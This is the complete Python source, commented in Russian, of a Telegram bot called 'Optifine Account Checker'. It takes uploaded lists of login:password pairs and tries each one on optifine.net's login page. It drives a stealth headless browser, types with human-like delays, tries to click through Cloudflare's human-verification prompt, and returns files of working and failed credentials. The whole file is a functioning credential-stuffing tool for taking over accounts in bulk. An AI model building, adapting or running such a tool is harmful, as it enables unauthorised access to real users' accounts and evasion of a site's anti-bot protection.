import os
import sys
import logging
import asyncio
import aiofiles
import time
import random
import subprocess
from datetime import datetime
from typing import Dict, List, Tuple

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException
from selenium_stealth import stealth

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('/app/debug/bot.log')
    ]
)
logger = logging.getLogger(__name__)

# Конфиг
TOKEN = os.environ.get('BOT_TOKEN')
if not TOKEN:
    print("❌ НЕТ ТОКЕНА! Установи BOT_TOKEN в переменных окружения")
    sys.exit(1)

ADMIN_IDS = os.environ.get('ADMIN_IDS', '').split(',')
ADMIN_IDS = [int(id.strip()) for id in ADMIN_IDS if id.strip()]
ALLOWED_USERS = ADMIN_IDS.copy() if ADMIN_IDS else []

# Статистика
bot_stats = {
    'total': 0,
    'valid': 0,
    'invalid': 0,
    'start_time': datetime.now()
}

class OptifineChecker:
    """Проверка аккаунтов на Optifine.net с selenium-stealth"""
    
    def __init__(self):
        self.driver = None
        self.cloudflare_passed = False
        logger.info("🚀 Инициализация OptifineChecker...")
        self.init_driver()
    
    def init_driver(self):
        """Инициализация драйвера с stealth режимом"""
        try:
            chrome_options = Options()
            
            # Основные настройки
            chrome_options.add_argument('--disable-blink-features=AutomationControlled')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--window-size=1920,1080')
            chrome_options.add_argument('--start-maximized')
            chrome_options.add_argument('--disable-extensions')
            chrome_options.add_argument('--disable-plugins')
            chrome_options.add_argument('--headless=new')
            chrome_options.add_argument('--disable-logging')
            chrome_options.add_argument('--log-level=3')
            chrome_options.add_argument('--silent')
            
            # ОТКЛЮЧАЕМ РЕЖИМ БЕЗОПАСНОСТИ ГУГЛА
            chrome_options.add_argument('--disable-web-security')
            chrome_options.add_argument('--allow-running-insecure-content')
            chrome_options.add_argument('--disable-features=VizDisplayCompositor')
            chrome_options.add_argument('--disable-features=TranslateUI')
            chrome_options.add_argument('--disable-features=BlinkGenPropertyTrees')
            chrome_options.add_argument('--disable-features=IsolateOrigins')
            chrome_options.add_argument('--disable-features=site-per-process')
            
            # User-Agent
            chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
            
            # Путь к ChromeDriver
            driver_path = '/usr/local/bin/chromedriver'
            if os.path.exists(driver_path):
                logger.info(f"✅ Найден ChromeDriver по пути: {driver_path}")
                service = Service(driver_path)
                self.driver = webdriver.Chrome(service=service, options=chrome_options)
            else:
                logger.info("🔄 Пробую запустить без указания пути...")
                self.driver = webdriver.Chrome(options=chrome_options)
            
            # Применяем stealth
            stealth(self.driver,
                languages=["en-US", "en"],
                vendor="Google Inc.",
                platform="Win32",
                webgl_vendor="Intel Inc.",
                renderer="Intel Iris OpenGL Engine",
                fix_hairline=True,
            )
            
            logger.info("✅ Драйвер успешно инициализирован")
            
        except Exception as e:
            logger.error(f"❌ Ошибка инициализации драйвера: {e}")
            logger.exception("Детали ошибки:")
            self.driver = None
    
    def human_like_delay(self, min_sec=1, max_sec=3):
        """Человекоподобная задержка"""
        time.sleep(random.uniform(min_sec, max_sec))
    
    def analyze_page(self, login_prefix):
        """Анализ структуры страницы для отладки"""
        try:
            # Сохраняем HTML
            with open(f"/app/debug/page_source_{login_prefix}.html", 'w', encoding='utf-8') as f:
                f.write(self.driver.page_source)
            
            # Сохраняем скриншот
            self.driver.save_screenshot(f"/app/debug/page_{login_prefix}.png")
            
            # Анализируем страницу
            logger.info(f"📌 Заголовок страницы: {self.driver.title}")
            logger.info(f"📌 Текущий URL: {self.driver.current_url}")
            
            # Проверяем наличие Cloudflare
            cloudflare_indicators = [
                "//*[contains(text(), 'Just a moment')]",
                "//*[contains(text(), 'security verification')]",
                "//*[contains(text(), 'Verify you are human')]",
                "//iframe[contains(@src, 'challenges.cloudflare.com')]",
                "//div[contains(@class, 'cf-browser-verification')]",
                "//input[@name='cf-turnstile-response']",
            ]
            
            for indicator in cloudflare_indicators:
                elements = self.driver.find_elements(By.XPATH, indicator)
                if elements:
                    logger.info(f"⚠️ Обнаружен Cloudflare: {indicator}")
                    break
            
            # Ищем все формы
            forms = self.driver.find_elements(By.TAG_NAME, "form")
            logger.info(f"📝 Найдено форм: {len(forms)}")
            
            for i, form in enumerate(forms):
                logger.info(f"Форма {i}:")
                try:
                    action = form.get_attribute('action')
                    method = form.get_attribute('method')
                    logger.info(f"  action: {action}, method: {method}")
                    
                    # Ищем все input в форме
                    inputs = form.find_elements(By.TAG_NAME, "input")
                    for inp in inputs:
                        input_type = inp.get_attribute('type')
                        input_name = inp.get_attribute('name')
                        input_id = inp.get_attribute('id')
                        input_class = inp.get_attribute('class')
                        input_placeholder = inp.get_attribute('placeholder')
                        logger.info(f"  Input: type={input_type}, name={input_name}, id={input_id}, class={input_class}, placeholder={input_placeholder}")
                    
                    # Ищем кнопки
                    buttons = form.find_elements(By.TAG_NAME, "button")
                    for btn in buttons:
                        btn_type = btn.get_attribute('type')
                        btn_text = btn.text
                        logger.info(f"  Button: type={btn_type}, text={btn_text}")
                        
                except Exception as e:
                    logger.error(f"Ошибка при анализе формы: {e}")
            
            return True
        except Exception as e:
            logger.error(f"Ошибка при анализе страницы: {e}")
            return False
    
    def handle_cloudflare(self, timeout=60):
        """Обработка Cloudflare защиты"""
        start_time = time.time()
        
        while time.time() - start_time < timeout:
            current_title = self.driver.title.lower()
            current_url = self.driver.current_url
            
            # Проверяем, не проскочили ли мы Cloudflare
            if 'login' in current_url and 'just a moment' not in current_title:
                logger.info("✅ Cloudflare пройден, на странице входа")
                return True
            
            # Проверяем наличие капчи Turnstile
            try:
                turnstile = self.driver.find_elements(By.CSS_SELECTOR, 
                    "[class*='turnstile'], [src*='challenges.cloudflare.com'], iframe[src*='challenges']")
                if turnstile and any(t.is_displayed() for t in turnstile):
                    logger.info("🔄 Обнаружена Turnstile капча, ждем автоматического решения...")
            except:
                pass
            
            # Проверяем наличие кнопки "Verify you are human"
            try:
                verify_buttons = self.driver.find_elements(By.XPATH, 
                    "//*[contains(text(), 'Verify') or contains(text(), 'verify')]")
                for btn in verify_buttons:
                    if btn.is_displayed() and btn.is_enabled():
                        logger.info("🖱️ Нажимаю 'Verify you are human'")
                        try:
                            btn.click()
                        except:
                            self.driver.execute_script("arguments[0].click();", btn)
                        self.human_like_delay(2, 4)
            except:
                pass
            
            # Проверяем, не появилась ли форма входа
            try:
                # Ищем любой input на странице (кроме скрытых)
                inputs = self.driver.find_elements(By.TAG_NAME, "input")
                visible_inputs = [i for i in inputs if i.is_displayed() and 
                                 i.get_attribute('type') not in ['hidden', 'checkbox', 'radio']]
                
                if visible_inputs:
                    logger.info(f"✅ Найдены видимые поля ввода ({len(visible_inputs)}), Cloudflare пройден")
                    return True
            except:
                pass
            
            # Ждем немного перед следующей проверкой
            self.human_like_delay(2, 4)
            
            # Логируем прогресс каждые 10 секунд
            elapsed = int(time.time() - start_time)
            if elapsed % 10 == 0 and elapsed > 0:
                logger.info(f"⏳ Ожидание прохождения Cloudflare... {elapsed}/{timeout} сек")
        
        logger.warning("⚠️ Cloudflare не пройден за отведенное время")
        return False
    
    def ensure_login_page(self):
        """Убеждаемся, что мы на странице входа и Cloudflare пройден"""
        if not self.driver:
            self.init_driver()
            if not self.driver:
                return False
        
        try:
            # Проверяем текущий URL
            current_url = self.driver.current_url
            
            # Если мы уже на странице входа и Cloudflare пройден
            if 'login' in current_url and 'just a moment' not in self.driver.title.lower():
                # Проверяем, есть ли поля ввода
                inputs = self.driver.find_elements(By.TAG_NAME, "input")
                visible_inputs = [i for i in inputs if i.is_displayed() and 
                                 i.get_attribute('type') not in ['hidden']]
                
                if len(visible_inputs) >= 2:  # Обычно есть поле логина и пароля
                    logger.info("✅ Уже на странице входа")
                    return True
            
            # Если нет - переходим на страницу входа
            logger.info("🌐 Перехожу на страницу входа...")
            self.driver.get("https://optifine.net/login")
            self.human_like_delay(3, 5)
            
            # Проходим Cloudflare
            if not self.handle_cloudflare(timeout=60):
                self.analyze_page("cloudflare_error")
                return False
            
            self.human_like_delay(2, 4)
            logger.info("✅ Готов к проверке аккаунтов")
            return True
            
        except Exception as e:
            logger.error(f"❌ Ошибка при подготовке страницы: {e}")
            return False
    
    async def check_account(self, login: str, password: str) -> Dict:
        """Проверка одного аккаунта через Selenium (используем существующую сессию)"""
        
        logger.info(f"🔍 Начинаю проверку: {login[:20]}...")
        
        if not self.driver:
            logger.error("❌ Драйвер не инициализирован")
            self.init_driver()
            if not self.driver:
                return {
                    'login': login,
                    'status': 'error',
                    'error': 'Драйвер не инициализирован'
                }
        
        try:
            # Убеждаемся, что мы на странице входа
            if not self.ensure_login_page():
                return {
                    'login': login,
                    'status': 'error',
                    'error': 'Не удалось загрузить страницу входа'
                }
            
            # Поиск поля email/username
            email_field = None
            email_selectors = [
                "//input[@name='username']",
                "//input[@name='email']",
                "//input[@id='username']",
                "//input[@id='email']",
                "//input[@type='text']",
                "//input[@type='email']",
                "//input[contains(@class, 'form-control')]",
                "//input[contains(@class, 'input')]",
                "//input[@placeholder='Username']",
                "//input[@placeholder='Email']",
                "//input[@placeholder='E-mail']",
                "//input[@placeholder='Login']",
                "//input[@name='log']",
                "//input[@name='user_login']",
                "//input[@name='user']",
                "//input[@autocomplete='username']",
                "//input[@type='password']/preceding::input[not(@type='hidden')][1]",
            ]
            
            for selector in email_selectors:
                try:
                    elements = self.driver.find_elements(By.XPATH, selector)
                    for element in elements:
                        if element.is_displayed():
                            email_field = element
                            logger.info(f"✅ Найдено поле email по селектору: {selector}")
                            break
                    if email_field:
                        break
                except Exception as e:
                    continue
            
            # Если все еще не нашли, ищем любой видимый текстовый input
            if not email_field:
                try:
                    all_inputs = self.driver.find_elements(By.TAG_NAME, "input")
                    for inp in all_inputs:
                        input_type = inp.get_attribute('type')
                        if (input_type not in ['hidden', 'submit', 'button', 'password', 'checkbox', 'radio'] 
                            and inp.is_displayed()):
                            email_field = inp
                            logger.info(f"✅ Найден первый подходящий input: type={input_type}")
                            break
                except:
                    pass
            
            if not email_field:
                logger.warning("❌ Поле email не найдено")
                return {
                    'login': login,
                    'status': 'error',
                    'error': 'Поле email не найдено'
                }
            
            # Поиск поля пароля
            password_field = None
            password_selectors = [
                "//input[@type='password']",
                "//input[@name='password']",
                "//input[@name='pass']",
                "//input[@name='pwd']",
                "//input[@id='password']",
                "//input[@id='pass']",
                "//input[contains(@class, 'password')]",
                "//input[@placeholder='Password']",
                "//input[@autocomplete='current-password']",
            ]
            
            for selector in password_selectors:
                try:
                    elements = self.driver.find_elements(By.XPATH, selector)
                    for element in elements:
                        if element.is_displayed():
                            password_field = element
                            logger.info(f"✅ Найдено поле пароля по селектору: {selector}")
                            break
                    if password_field:
                        break
                except:
                    continue
            
            if not password_field:
                logger.warning("❌ Поле пароля не найдено")
                return {
                    'login': login,
                    'status': 'error',
                    'error': 'Поле пароля не найдено'
                }
            
            # Поиск кнопки входа
            submit_button = None
            submit_selectors = [
                "//button[@type='submit']",
                "//input[@type='submit']",
                "//button[contains(text(), 'Login')]",
                "//button[contains(text(), 'Sign in')]",
                "//button[contains(text(), 'Log in')]",
                "//button[contains(text(), 'Войти')]",
                "//input[@value='Login']",
                "//input[@value='Sign in']",
                "//input[@value='Log in']",
                "//button[contains(@class, 'btn-primary')]",
                "//button[contains(@class, 'btn')]",
                "//*[@type='submit']",
            ]
            
            for selector in submit_selectors:
                try:
                    elements = self.driver.find_elements(By.XPATH, selector)
                    for element in elements:
                        if element.is_displayed() and element.is_enabled():
                            submit_button = element
                            logger.info(f"✅ Найдена кнопка по селектору: {selector}")
                            break
                    if submit_button:
                        break
                except:
                    continue
            
            if not submit_button:
                logger.warning("❌ Кнопка не найдена")
                return {
                    'login': login,
                    'status': 'error',
                    'error': 'Кнопка не найдена'
                }
            
            # Очищаем поля перед вводом (на случай если там уже что-то есть)
            try:
                email_field.clear()
            except:
                pass
            
            try:
                password_field.clear()
            except:
                pass
            
            # Вводим email с человеческой задержкой
            logger.info(f"✍️ Ввожу email: {login[:20]}...")
            for char in login:
                email_field.send_keys(char)
                time.sleep(random.uniform(0.03, 0.08))
            
            self.human_like_delay(0.5, 1)
            
            # Вводим пароль
            logger.info(f"✍️ Ввожу пароль...")
            for char in password:
                password_field.send_keys(char)
                time.sleep(random.uniform(0.03, 0.08))
            
            self.human_like_delay(0.5, 1)
            
            # Сохраняем скриншот перед отправкой (для отладки)
            if random.random() < 0.1:  # Сохраняем только каждый 10-й для экономии места
                self.driver.save_screenshot(f"/app/debug/before_submit_{login[:10]}.png")
            
            # Нажимаем кнопку
            logger.info("🖱️ Нажимаю кнопку входа")
            try:
                submit_button.click()
            except:
                try:
                    self.driver.execute_script("arguments[0].click();", submit_button)
                except Exception as e:
                    logger.error(f"❌ Не удалось нажать кнопку: {e}")
                    return {
                        'login': login,
                        'status': 'error',
                        'error': 'Не удалось нажать кнопку'
                    }
            
            # Ждем результат
            self.human_like_delay(5, 8)
            
            # Сохраняем результат (для отладки)
            if random.random() < 0.1:
                self.driver.save_screenshot(f"/app/debug/after_submit_{login[:10]}.png")
            
            # Анализируем результат
            current_url = self.driver.current_url
            page_text = self.driver.find_element(By.TAG_NAME, "body").text.lower()
            
            logger.info(f"📌 URL после входа: {current_url}")
            
            # Критерии успеха для Optifine
            success_indicators = [
                'downloads', 'my account', 'profile', 'dashboard', 
                'welcome', 'logout', 'log out', 'premium',
                'you are logged in', 'successfully logged'
            ]
            
            # Критерии ошибки
            error_indicators = [
                'invalid', 'incorrect', 'wrong', 'error', 
                'failed', 'not found', 'try again', 'does not exist',
                'doesn\'t exist', 'not registered', 'no account',
                'invalid username or password'
            ]
            
            # Проверяем успешность
            if any(indicator in current_url.lower() for indicator in ['downloads', 'profile', 'account', 'dashboard']):
                logger.info(f"✅ НАЙДЕН РАБОЧИЙ: {login[:20]}")
                
                # Возвращаемся на страницу входа для следующего аккаунта
                self.driver.get("https://optifine.net/login")
                self.human_like_delay(2, 4)
                
                return {
                    'login': login,
                    'password': password,
                    'status': 'valid',
                    'method': 'login_success'
                }
            
            if any(indicator in page_text for indicator in success_indicators):
                logger.info(f"✅ НАЙДЕН РАБОЧИЙ: {login[:20]}")
                
                # Возвращаемся на страницу входа
                self.driver.get("https://optifine.net/login")
                self.human_like_delay(2, 4)
                
                return {
                    'login': login,
                    'password': password,
                    'status': 'valid',
                    'method': 'login_success'
                }
            
            if any(indicator in page_text for indicator in error_indicators):
                logger.info(f"❌ Неверный: {login[:20]}")
                
                # Возвращаемся на страницу входа
                self.driver.get("https://optifine.net/login")
                self.human_like_delay(2, 4)
                
                return {
                    'login': login,
                    'status': 'invalid',
                    'error': 'Неверный логин/пароль'
                }
            
            # Проверяем, остались ли мы на странице входа
            if 'login' in current_url.lower():
                logger.info(f"❌ Остались на странице входа: {login[:20]}")
                return {
                    'login': login,
                    'status': 'invalid',
                    'error': 'Остались на странице входа'
                }
            
            # Если неопределенный результат, возвращаемся на страницу входа
            logger.info(f"⚠️ Неопределенный результат для {login[:20]}")
            self.driver.get("https://optifine.net/login")
            self.human_like_delay(2, 4)
            
            return {
                'login': login,
                'status': 'invalid',
                'error': 'Неопределенный результат'
            }
            
        except Exception as e:
            logger.error(f"❌ Ошибка при проверке {login[:20]}: {e}")
            logger.exception("Детали ошибки:")
            
            # Пытаемся восстановить сессию
            try:
                self.driver.get("https://optifine.net/login")
                self.human_like_delay(3, 5)
            except:
                pass
            
            return {
                'login': login,
                'status': 'error',
                'error': str(e)[:100]
            }
    
    def close(self):
        """Закрытие драйвера"""
        if self.driver:
            try:
                self.driver.quit()
                logger.info("✅ Драйвер закрыт")
            except:
                pass

# Создаем директорию для отладки
os.makedirs('/app/debug', exist_ok=True)

# Создаем экземпляр
logger.info("🚀 Создание экземпляра OptifineChecker...")
checker = OptifineChecker()

async def debug_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Отправка файлов отладки"""
    # Проверяем, является ли пользователь администратором
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ **Нет доступа к отладке**")
        return
    
    try:
        # Проверяем, существует ли папка debug
        if not os.path.exists('/app/debug'):
            await update.message.reply_text("📁 Папка /app/debug не найдена")
            return
        
        # Получаем список файлов
        files = os.listdir('/app/debug')
        
        if not files:
            await update.message.reply_text("📁 Папка debug пуста")
            return
        
        # Сортируем файлы по дате изменения (новые сначала)
        files.sort(key=lambda x: os.path.getmtime(os.path.join('/app/debug', x)), reverse=True)
        
        # Отправляем первые 5 файлов (самые новые)
        sent_count = 0
        for file in files[:5]:
            file_path = os.path.join('/app/debug', file)
            
            # Проверяем размер файла (Telegram ограничение ~50MB)
            if os.path.getsize(file_path) > 50 * 1024 * 1024:
                await update.message.reply_text(f"⚠️ Файл {file} слишком большой (>50MB)")
                continue
            
            try:
                with open(file_path, 'rb') as f:
                    await update.message.reply_document(
                        document=f,
                        filename=file,
                        caption=f"📁 **Debug файл:** `{file}`"
                    )
                sent_count += 1
                await asyncio.sleep(1)
            except Exception as e:
                await update.message.reply_text(f"❌ Ошибка при отправке {file}: {e}")
        
        await update.message.reply_text(
            f"✅ **Отправлено файлов:** {sent_count}\n"
            f"📁 **Всего в папке:** {len(files)}"
        )
        
    except Exception as e:
        await update.message.reply_text(f"❌ **Ошибка:** {e}")
        logger.error(f"Ошибка в debug_command: {e}")

async def process_file(file_path, update, context):
    """Обработка файла с аккаунтами"""
    
    results = {
        'valid': [],
        'invalid': [],
        'errors': []
    }
    
    msg = await update.message.reply_text(
        "🚀 **Запускаю проверку Optifine.net...**\n"
        "⏳ Пожалуйста, подождите"
    )
    
    try:
        # Читаем файл
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        
        # Парсим аккаунты
        lines = content.strip().split('\n')
        accounts = []
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
            
            for sep in [':', ';', '|', '\t']:
                if sep in line:
                    parts = line.split(sep, 1)
                    if len(parts) == 2 and parts[0] and parts[1]:
                        accounts.append((parts[0].strip(), parts[1].strip()))
                        break
        
        total = len(accounts)
        
        if total == 0:
            await msg.edit_text("❌ **Нет аккаунтов в файле**")
            return
        
        await msg.edit_text(
            f"📥 **Файл:** {update.message.document.file_name}\n"
            f"📊 **Аккаунтов:** {total}\n\n"
            f"🔄 **Начинаю проверку...**"
        )
        
        start_time = time.time()
        
        # Сначала проходим Cloudflare один раз
        await msg.edit_text(
            f"🔄 **Подготавливаю сессию...**\n"
            f"⏳ Прохожу Cloudflare защиту..."
        )
        
        if not checker.ensure_login_page():
            await msg.edit_text("❌ **Не удалось пройти Cloudflare защиту**")
            return
        
        await msg.edit_text(
            f"📥 **Файл:** {update.message.document.file_name}\n"
            f"📊 **Аккаунтов:** {total}\n\n"
            f"✅ **Cloudflare пройден, начинаю проверку...**"
        )
        
        for i, (login, password) in enumerate(accounts, 1):
            # Обновляем прогресс
            if i % 5 == 0 or i == total:
                elapsed = time.time() - start_time
                await msg.edit_text(
                    f"📊 **Прогресс:** {i}/{total}\n"
                    f"✅ **Рабочих:** {len(results['valid'])}\n"
                    f"⏱ **Время:** {elapsed:.1f}с\n\n"
                    f"🔄 **Проверяю:** {login[:15]}..."
                )
            
            # Проверка аккаунта
            result = await checker.check_account(login, password)
            
            # Сортируем результаты
            if result['status'] == 'valid':
                results['valid'].append(result)
                bot_stats['valid'] += 1
                logger.info(f"✅ РАБОЧИЙ: {login[:20]}")
            elif result['status'] == 'invalid':
                results['invalid'].append(result)
                bot_stats['invalid'] += 1
                logger.info(f"❌ НЕРАБОЧИЙ: {login[:20]}")
            else:
                results['errors'].append(result)
                bot_stats['invalid'] += 1
                logger.info(f"⚠️ ОШИБКА: {login[:20]} - {result.get('error')}")
            
            bot_stats['total'] += 1
            
            # Небольшая задержка между проверками
            await asyncio.sleep(2)
        
        # Сохраняем результаты
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Файл с рабочими
        if results['valid']:
            valid_file = f"✅_РАБОЧИЕ_{len(results['valid'])}шт_{timestamp}.txt"
            async with aiofiles.open(valid_file, 'w', encoding='utf-8') as f:
                for acc in results['valid']:
                    await f.write(f"{acc['login']}:{acc['password']}\n")
            
            with open(valid_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=valid_file,
                    caption=f"✅ **Рабочих: {len(results['valid'])}**"
                )
            os.remove(valid_file)
        
        # Файл с нерабочими
        if results['invalid']:
            invalid_file = f"❌_НЕРАБОЧИЕ_{len(results['invalid'])}шт_{timestamp}.txt"
            async with aiofiles.open(invalid_file, 'w', encoding='utf-8') as f:
                for acc in results['invalid']:
                    await f.write(f"{acc['login']}:{acc['password']}\n")
            
            with open(invalid_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=invalid_file,
                    caption=f"❌ **Нерабочих: {len(results['invalid'])}**"
                )
            os.remove(invalid_file)
        
        # Файл с ошибками
        if results['errors']:
            error_file = f"⚠️_ОШИБКИ_{len(results['errors'])}шт_{timestamp}.txt"
            async with aiofiles.open(error_file, 'w', encoding='utf-8') as f:
                for acc in results['errors']:
                    await f.write(f"{acc['login']}:{acc['password']} | {acc.get('error', 'unknown')}\n")
            
            with open(error_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=error_file,
                    caption=f"⚠️ **Ошибок: {len(results['errors'])}**"
                )
            os.remove(error_file)
        
        # Итог
        elapsed = time.time() - start_time
        minutes = int(elapsed // 60)
        seconds = int(elapsed % 60)
        
        await update.message.reply_text(
            f"✅ **ПРОВЕРКА ЗАВЕРШЕНА!**\n\n"
            f"📊 **Статистика:**\n"
            f"• Всего: {total}\n"
            f"• ✅ Рабочих: {len(results['valid'])}\n"
            f"• ❌ Нерабочих: {len(results['invalid'])}\n"
            f"• ⚠️ Ошибок: {len(results['errors'])}\n\n"
            f"⏱ **Время:** {minutes}м {seconds}с"
        )
        
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await update.message.reply_text(f"❌ **Ошибка:** {str(e)[:100]}")
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Старт"""
    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ **Нет доступа**")
        return
    
    uptime = datetime.now() - bot_stats['start_time']
    hours = int(uptime.seconds // 3600)
    minutes = int((uptime.seconds // 60) % 60)
    
    keyboard = [
        [InlineKeyboardButton("📊 Статистика", callback_data='stats')],
        [InlineKeyboardButton("❓ Помощь", callback_data='help')]
    ]
    
    await update.message.reply_text(
        f"👋 **Optifine Account Checker**\n\n"
        f"🔍 Проверяет аккаунты на optifine.net\n"
        f"📊 **Статистика:**\n"
        f"• Проверено: {bot_stats['total']}\n"
        f"• Найдено рабочих: {bot_stats['valid']}\n\n"
        f"📥 **Отправь .txt файл** с логинами и паролями\n"
        f"Формат: логин:пароль (каждый с новой строки)\n\n"
        f"🔧 **Для админов:** /debug - получить файлы отладки\n\n"
        f"⏱ **Работаю:** {hours}ч {minutes}мин",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Кнопки"""
    query = update.callback_query
    await query.answer()
    
    if query.data == 'stats':
        uptime = datetime.now() - bot_stats['start_time']
        hours = int(uptime.seconds // 3600)
        minutes = int((uptime.seconds // 60) % 60)
        
        await query.edit_message_text(
            f"📊 **СТАТИСТИКА**\n\n"
            f"Всего проверено: {bot_stats['total']}\n"
            f"✅ Рабочих: {bot_stats['valid']}\n"
            f"❌ Нерабочих: {bot_stats['invalid']}\n\n"
            f"⏱ Аптайм: {hours}ч {minutes}мин"
        )
    
    elif query.data == 'help':
        await query.edit_message_text(
            "❓ **КАК ПОЛЬЗОВАТЬСЯ**\n\n"
            "1️⃣ Создай .txt файл\n"
            "2️⃣ В каждой строке: логин:пароль\n"
            "3️⃣ Отправь файл боту\n\n"
            "📌 **Пример:**\n"
            "`user@mail.com:password123`\n"
            "`player123:qwerty456`\n\n"
            "⚡️ **Результат:**\n"
            "• ✅ рабочие аккаунты\n"
            "• ❌ нерабочие аккаунты\n"
            "• ⚠️ ошибки проверки\n\n"
            "🔧 **Для админов:** /debug - получить файлы отладки"
        )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Получение файла"""
    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ **Нет доступа**")
        return
    
    doc = update.message.document
    
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ **Нужен .txt файл**")
        return
    
    if doc.file_size > 10 * 1024 * 1024:
        await update.message.reply_text(f"❌ **Файл > 10 МБ**")
        return
    
    try:
        await update.message.reply_text(
            f"📥 **Файл получен:** {doc.file_name}\n"
            f"📦 **Размер:** {doc.file_size / 1024:.1f} КБ\n\n"
            f"🔄 **Запускаю проверку...**"
        )
        
        file = await context.bot.get_file(doc.file_id)
        path = f"temp_{update.effective_user.id}_{doc.file_name}"
        await file.download_to_drive(path)
        await process_file(path, update, context)
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await update.message.reply_text(f"❌ **Ошибка:** {str(e)[:100]}")

def main():
    """Запуск"""
    print("=" * 50)
    print("🚀 ЗАПУСК OPTIFINE CHECKER")
    print("=" * 50)
    print(f"📁 Директория отладки: /app/debug")
    print(f"👑 Admin IDs: {ADMIN_IDS}")
    print("=" * 50)
    
    app = Application.builder().token(TOKEN).build()
    
    # Добавляем обработчики команд
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("debug", debug_command))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    print("✅ БОТ ЗАПУЩЕН!")
    print("=" * 50)
    
    try:
        app.run_polling()
    except Exception as e:
        logger.error(f"Ошибка: {e}")
    finally:
        if checker:
            checker.close()

if __name__ == '__main__':
    main()